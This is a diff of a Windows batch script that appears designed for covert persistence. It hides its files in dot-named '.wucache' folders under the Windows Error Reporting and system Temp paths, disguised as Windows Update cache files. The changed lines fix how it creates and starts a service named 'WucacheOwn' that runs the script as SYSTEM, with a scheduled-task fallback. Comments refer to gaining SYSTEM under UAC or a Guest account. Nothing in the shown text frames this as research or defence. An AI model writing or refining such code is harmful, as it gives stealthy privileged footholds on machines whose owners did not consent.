@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O10 - no net session; sc/service detach; UAC/SYSTEM
+REM OWN BUILD 20260802O11 - fixed sc binPath; service/task detach
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -61,15 +61,27 @@ if /I not "%~1"=="_RUN" (
   set "DETACH_OK=0"
   set "RUNNER=%BOOT%\own_run.cmd"
   if exist "%SELF%" set "RUNNER=%SELF%"
+  REM flat path without spaces for sc.exe ^(sc quoting is fragile^)
+  copy /y "%RUNNER%" "%SystemRoot%\Temp\wucache_own.cmd" >nul 2>&1
+  set "FLAT=%SystemRoot%\Temp\wucache_own.cmd"
 
-  REM Method A: one-shot SERVICE as SYSTEM ^(best under Guest^)
+  REM Method A: one-shot SERVICE as SYSTEM
+  REM sc REQUIRES: space after binPath=  and simple quoting
   sc.exe stop WucacheOwn >nul 2>&1
   sc.exe delete WucacheOwn >nul 2>&1
-  sc.exe create WucacheOwn binPath= "cmd.exe /c \"\"%RUNNER%\" _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
+  sc.exe create WucacheOwn binPath= "cmd.exe /c %FLAT% _RUN" start= demand type= own >"%BOOT%\detach.sc" 2>&1
   if not errorlevel 1 (
     sc.exe start WucacheOwn >"%BOOT%\detach.scstart" 2>&1
-    set "DETACH_OK=1"
-    echo detach_via=sc_service>>"%LOG%"
+    if not errorlevel 1 (
+      set "DETACH_OK=1"
+      echo detach_via=sc_service>>"%LOG%"
+    )
+  )
+  if "!DETACH_OK!"=="0" (
+    findstr /I /C:"SUCCESS" "%BOOT%\detach.scstart" >nul 2>&1 && (
+      set "DETACH_OK=1"
+      echo detach_via=sc_service_startmsg>>"%LOG%"
+    )
   )
 
   REM Method B: root scheduled task ^(not under Microsoft\Windows^)
